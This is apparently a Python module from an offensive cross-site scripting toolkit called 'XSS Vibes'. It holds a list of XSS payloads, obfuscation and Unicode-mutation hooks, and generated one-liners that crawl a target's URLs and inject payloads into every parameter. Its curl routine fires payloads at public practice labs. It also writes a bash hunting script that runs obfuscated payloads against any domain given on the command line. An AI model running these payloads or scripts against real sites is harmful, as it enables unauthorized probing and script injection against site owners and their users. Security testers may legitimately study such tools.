#!/usr/bin/env python3
"""
XSS Vibes - Advanced Integration Module
Combines community oneliners with our GOD TIER techniques
"""
import json
import subprocess
import os
import sys
from pathlib import Path

# Add xss_vibes to path
sys.path.append("/home/jarek/xss_vibes")

try:
    from xss_vibes.advanced_obfuscator import AdvancedXSSObfuscator
    from xss_vibes.unicode_mutator import UnicodeXSSMutator
    from xss_vibes.payload_manager import PayloadManager
except ImportError:
    print("⚠️ XSS Vibes modules not found. Running in standalone mode.")
    AdvancedXSSObfuscator = None
    UnicodeXSSMutator = None
    PayloadManager = None


class OnelinerXSSIntegration:
    """Integrates community oneliners with XSS Vibes advanced techniques"""

    def __init__(self):
        self.results_dir = "oneliner_results"
        self.ensure_results_dir()
        self.obfuscator = AdvancedXSSObfuscator() if AdvancedXSSObfuscator else None
        self.mutator = UnicodeXSSMutator() if UnicodeXSSMutator else None

    def ensure_results_dir(self):
        """Create results directory"""
        Path(self.results_dir).mkdir(exist_ok=True)

    def get_community_payloads(self):
        """Get payloads from community oneliners"""
        payloads = [
            # Basic XSS payloads from oneliners
            '"><script>alert(1)</script>',
            '"><svg onload=confirm(1);>',
            '"><img src=x onerror=alert(1);>',
            "%22><svg%20onload=confirm(1);>",
            "<svg onload=alert(1)>",
            # Advanced payloads from oneliners
            "{{7*7}}",  # Template injection
            "alert(1)//",  # JSONP
            "javascript:alert(1);",  # href injection
            '"><iframe src=javascript:alert(1)>',
            '"><body onload=alert(1)>',
            # DOM-based payloads
            '"><img src=x onerror=alert(document.domain)>',
            '"><script>alert(document.cookie)</script>',
            '"><svg/onload=alert(location.hash)>',
        ]
        return payloads

    def enhance_with_god_tier(self, base_payload: str):
        """Enhance basic payload with GOD TIER techniques"""
        enhanced_payloads = []

        if self.obfuscator:
            try:
                # Apply various GOD TIER techniques
                techniques = [
                    "cuneiform_xss",
                    "pdf_xss",
                    "markdown_xss",
                    "svg_xlink_href",
                    "dom_clobbering_prototype",
                    "constructor_chain_exploit",
                    "zero_width_injection",
                ]

                for technique in techniques:
                    if hasattr(self.obfuscator, technique):
                        method = getattr(self.obfuscator, technique)
                        enhanced = method(base_payload)
                        enhanced_payloads.append(
                            {
                                "technique": technique,
                                "payload": enhanced,
                                "original": base_payload,
                            }
                        )

            except Exception as e:
                print(f"⚠️ Error enhancing payload: {e}")

        if self.mutator:
            try:
                # Apply Unicode mutations
                unicode_enhanced = self.mutator.mutate_payload(base_payload)
                enhanced_payloads.extend(
                    [
                        {
                            "technique": "unicode_mutation",
                            "payload": mutation,
                            "original": base_payload,
                        }
                        for mutation in unicode_enhanced
                    ]
                )
            except Exception as e:
                print(f"⚠️ Error mutating payload: {e}")

        return enhanced_payloads

    def create_enhanced_oneliners(self):
        """Create enhanced oneliners with our advanced payloads"""
        print("🔥 Creating enhanced oneliners with GOD TIER techniques...")

        community_payloads = self.get_community_payloads()
        enhanced_oneliners = []

        for payload in community_payloads:
            enhanced_payloads = self.enhance_with_god_tier(payload)

            for enhanced in enhanced_payloads:
                # Create oneliners for different tools
                oneliners = self.create_tool_oneliners(
                    enhanced["payload"], enhanced["technique"]
                )
                enhanced_oneliners.extend(oneliners)

        # Save enhanced oneliners
        output_file = f"{self.results_dir}/enhanced_oneliners.txt"
        with open(output_file, "w") as f:
            f.write("# XSS Vibes - Enhanced OneLiners with GOD TIER Techniques\n")
            f.write("# Generated from community techniques + advanced obfuscation\n\n")

            for oneliner in enhanced_oneliners:
                f.write(f"# Technique: {oneliner['technique']}\n")
                f.write(f"# Tool: {oneliner['tool']}\n")
                f.write(f"{oneliner['command']}\n\n")

        print(f"✅ Enhanced oneliners saved to: {output_file}")
        return enhanced_oneliners

    def create_tool_oneliners(self, payload: str, technique: str):
        """Create oneliners for different tools with the given payload"""
        # URL encode the payload for safety
        import urllib.parse

        encoded_payload = urllib.parse.quote(payload, safe="")

        oneliners = [
            {
                "technique": technique,
                "tool": "qsreplace",
                "command": f"waybackurls target.com | grep '=' | qsreplace '{payload}'",
            },
            {
                "technique": technique,
                "tool": "gospider",
                "command": f"gospider -s target.com | grep '=' | qsreplace '{payload}'",
            },
            {
                "technique": technique,
                "tool": "gau",
                "command": f"gau target.com | grep '=' | qsreplace '{payload}'",
            },
            {
                "technique": technique,
                "tool": "hakrawler",
                "command": f"hakrawler -url target.com | grep '=' | qsreplace '{payload}'",
            },
            {
                "technique": technique,
                "tool": "httpx",
                "command": f"echo target.com | httpx | waybackurls | grep '=' | qsreplace '{payload}'",
            },
            {
                "technique": technique,
                "tool": "dalfox",
                "command": f"echo 'target.com/?param=' | qsreplace '{payload}' | dalfox pipe",
            },
        ]

        return oneliners

    def test_payload_effectiveness(
        self, payload: str, target: str = "testphp.vulnweb.com"
    ):
        """Test payload effectiveness against a target"""
        print(f"🧪 Testing payload effectiveness: {payload[:50]}...")

        # Create test URL
        test_url = f"http://{target}/artists.php?artist={payload}"

        try:
            # Test with curl
            result = subprocess.run(
                ["curl", "-s", "--max-time", "10", test_url],
                capture_output=True,
                text=True,
                timeout=15,
            )

            # Check if payload is reflected
            if payload in result.stdout or any(
                char in result.stdout for char in ["<script>", "<svg", "<img"]
            ):
                return {
                    "effective": True,
                    "response_snippet": result.stdout[:200],
                    "payload": payload,
                }
            else:
                return {
                    "effective": False,
                    "response_snippet": result.stdout[:200],
                    "payload": payload,
                }

        except Exception as e:
            return {"effective": False, "error": str(e), "payload": payload}

    def benchmark_techniques(self):
        """Benchmark different techniques against test targets"""
        print("📊 Benchmarking GOD TIER techniques...")

        test_targets = [
            "testphp.vulnweb.com",
            "xss-game.appspot.com",
            "demo.testfire.net",
        ]

        community_payloads = self.get_community_payloads()
        results = []

        for payload in community_payloads[:3]:  # Test first 3 for speed
            enhanced_payloads = self.enhance_with_god_tier(payload)

            for enhanced in enhanced_payloads[:2]:  # Test first 2 variations
                for target in test_targets:
                    result = self.test_payload_effectiveness(
                        enhanced["payload"], target
                    )
                    result["technique"] = enhanced["technique"]
                    result["target"] = target
                    results.append(result)

        # Save benchmark results
        benchmark_file = f"{self.results_dir}/technique_benchmark.json"
        with open(benchmark_file, "w") as f:
            json.dump(results, f, indent=2)

        print(f"✅ Benchmark results saved to: {benchmark_file}")

        # Print summary
        effective_count = sum(1 for r in results if r.get("effective", False))
        total_count = len(results)
        success_rate = (effective_count / total_count) * 100 if total_count > 0 else 0

        print(f"📈 Success rate: {effective_count}/{total_count} ({success_rate:.1f}%)")

        return results

    def create_custom_hunting_script(self):
        """Create custom hunting script with our techniques"""
        script_content = f"""#!/bin/bash

# XSS Vibes - Custom Hunting Script
# Integrates community oneliners with GOD TIER techniques

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target.com>"
    exit 1
fi

echo "🔥 XSS Vibes Custom Hunt on $TARGET"
echo "=================================="

# Create results directory
mkdir -p custom_hunt_results

# Basic community techniques
echo "📡 Running community techniques..."

# Wayback + our payloads
waybackurls $TARGET | grep '=' | qsreplace '𒀀=alert,𒉺=!𒀀+𒀀' > custom_hunt_results/cuneiform_test.txt

# GAU + Unicode payloads  
gau $TARGET | grep '=' | qsreplace 'ale‌rt(1)' > custom_hunt_results/unicode_test.txt

# Gospider + PDF XSS
gospider -s $TARGET | grep '=' | qsreplace '%PDF-1.4%0A1%200%20obj%3C%3C/Type/Catalog/Pages%202%200%20R/OpenAction%3C%3C/Type/Action/S/JavaScript/JS(alert(\\'XSS\\'))%3E%3E%3E%3E' > custom_hunt_results/pdf_test.txt

# Advanced DOM techniques
echo "🎯 Running advanced DOM techniques..."
gau $TARGET | grep -E "(hash|fragment|location)" | qsreplace '"><svg/onload=top[/\\.\\*\\/source/]=URL>' > custom_hunt_results/dom_advanced.txt

# Constructor chain exploitation
gau $TARGET | grep '=' | qsreplace 'constructor[constructor](alert(1))()' > custom_hunt_results/constructor_chain.txt

# SVG xlink:href trickery
gau $TARGET | grep '=' | qsreplace '"><svg><use href="#x"></use><symbol id="x"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></symbol></svg>' > custom_hunt_results/svg_xlink.txt

echo "✅ Custom hunt completed!"
echo "📁 Results in: custom_hunt_results/"
"""

        script_file = f"{self.results_dir}/custom_hunt.sh"
        with open(script_file, "w") as f:
            f.write(script_content)

        # Make executable
        os.chmod(script_file, 0o755)

        print(f"✅ Custom hunting script created: {script_file}")
        return script_file


def main():
    """Main integration function"""
    print("🔥 XSS Vibes - Oneliner Integration")
    print("=" * 50)

    integrator = OnelinerXSSIntegration()

    # Create enhanced oneliners
    enhanced_oneliners = integrator.create_enhanced_oneliners()
    print(f"📊 Created {len(enhanced_oneliners)} enhanced oneliners")

    # Benchmark techniques
    print("\n🧪 Running effectiveness benchmark...")
    benchmark_results = integrator.benchmark_techniques()

    # Create custom hunting script
    print("\n🛠️ Creating custom hunting script...")
    custom_script = integrator.create_custom_hunting_script()

    print(f"\n🏆 Integration completed!")
    print(f"📁 Results directory: {integrator.results_dir}")
    print(f"🔧 Custom script: {custom_script}")
    print("\nTo use the custom script:")
    print(f"chmod +x {custom_script}")
    print(f"./{custom_script} target.com")


if __name__ == "__main__":
    main()
